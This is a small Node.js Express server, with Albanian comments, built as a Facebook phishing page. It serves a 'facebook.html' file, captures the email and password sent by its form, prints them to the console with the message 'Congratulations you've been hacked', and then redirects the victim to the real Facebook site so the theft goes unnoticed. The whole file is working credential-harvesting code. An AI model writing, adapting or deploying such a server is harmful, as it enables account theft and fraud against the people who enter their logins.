const express = require("express");

const app = express();

// Per me mujt me iu qas te dhanave qe vijne nga forma
app.use(express.urlencoded({extended: false}));

app.get("/", (req, res)=>{
    res.sendFile(__dirname + "/facebook.html")
})

app.post("/", (req, res)=>{
    // const {email, password} = req.body;
    const email = req.body.email;
    const password = req.body.password;

    console.log(`Congratulations you've been hacked. Email: ${email} Password: ${password}`);
    res.redirect("https://www.facebook.com");
})

app.listen(8000, ()=>{
    console.log("Server is running on port http://localhost:8000");
})